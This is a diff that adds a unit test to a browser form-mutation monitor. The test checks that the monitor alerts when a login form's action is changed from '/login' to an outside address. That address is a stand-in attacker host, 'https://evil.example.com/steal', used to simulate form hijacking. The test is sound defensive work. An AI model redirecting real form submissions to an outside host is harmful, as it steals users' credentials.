@@ -149,6 +149,68 @@ describe("mutation_monitor DOM integration", () => {
     stopMutationMonitor();
   });
 
+  it("detects cross-domain action change on a pre-existing snapshotted form", async () => {
+    const alerts: MutationAlert[] = [];
+    const form = document.createElement("form");
+    form.setAttribute("action", "/login");
+    document.body.appendChild(form);
+    const nativeMutationObserver = globalThis.MutationObserver;
+    let mutationCallback: MutationCallback = () => {
+      throw new Error("MutationObserver callback was not initialized");
+    };
+
+    class TestMutationObserver {
+      constructor(callback: MutationCallback) {
+        mutationCallback = callback;
+      }
+
+      observe(): void {}
+
+      disconnect(): void {}
+    }
+
+    vi.stubGlobal("MutationObserver", TestMutationObserver);
+
+    const querySelectorAll = document.querySelectorAll.bind(document);
+    const querySpy = vi
+      .spyOn(document, "querySelectorAll")
+      .mockImplementation((selector: string) => {
+        if (selector === "form") {
+          return [form] as unknown as NodeListOf<Element>;
+        }
+        return querySelectorAll(selector);
+      });
+
+    try {
+      startMutationMonitor(document, (a) => alerts.push(a));
+      querySpy.mockRestore();
+
+      form.setAttribute("action", "https://evil.example.com/steal");
+      mutationCallback?.(
+        [
+          {
+            type: "attributes",
+            target: form,
+            attributeName: "action",
+          } as unknown as MutationRecord,
+        ],
+        {} as MutationObserver
+      );
+
+      vi.advanceTimersByTime(150);
+      await vi.advanceTimersByTimeAsync(150);
+
+      const actionAlerts = alerts.filter((a) => a.type === "form_action_changed");
+      expect(actionAlerts.length).toBeGreaterThanOrEqual(1);
+      expect(actionAlerts[0]!.details).toContain('was "/login"');
+    } finally {
+      querySpy.mockRestore();
+      form.remove();
+      stopMutationMonitor();
+      vi.stubGlobal("MutationObserver", nativeMutationObserver);
+    }
+  });
+
   it("does not alert for form action unchanged", async () => {
     const alerts: MutationAlert[] = [];
     const form = document.createElement("form");
